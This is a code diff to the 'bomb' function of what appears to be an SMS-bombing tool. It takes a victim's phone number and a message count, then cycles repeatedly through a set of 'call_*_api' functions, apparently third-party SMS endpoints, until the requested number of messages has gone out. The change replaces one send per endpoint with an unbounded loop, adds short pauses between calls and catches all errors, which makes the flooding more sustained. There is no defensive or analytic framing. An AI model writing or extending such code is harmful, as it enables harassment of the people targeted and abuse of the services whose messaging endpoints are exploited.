@@ -1036,15 +1036,31 @@ def bomb(phone_number, amount):
     status_data["failed"] = []
     status_data["running"] = True
 
-    max_available = len(api_functions)
-    count = min(amount, max_available)
+    if not api_functions:
+        print("No API functions found (functions starting with 'call_' and ending with '_api').")
+        status_data["running"] = False
+        return
 
-    for api in api_functions[:count]:
-        success = api(phone_number)
-        if success:
-            status_data["sent"] += 1
-        else:
-            status_data["failed"].append(api.__name__)
+    message_goal = amount
+    
+    while status_data["sent"] < message_goal:
+        for api_func in api_functions:
+            if status_data["sent"] >= message_goal:
+                break
+
+            try:
+                if api_func(phone_number):
+                    status_data["sent"] += 1
+                    # You can add print statements here if you want server-side console logs
+                    # print(f"SMS sent successfully via {api_func.__name__}. Total sent: {status_data['sent']}/{message_goal}")
+                else:
+                    status_data["failed"].append(api_func.__name__)
+                    # print(f"SMS failed via {api_func.__name__}.")
+                time.sleep(0.3)
+            except Exception: # Catching all exceptions
+                status_data["failed"].append(api_func.__name__)
+                # print(f"Exception calling {api_func.__name__}: {e}")
+                time.sleep(0.3)
 
     status_data["running"] = False
 
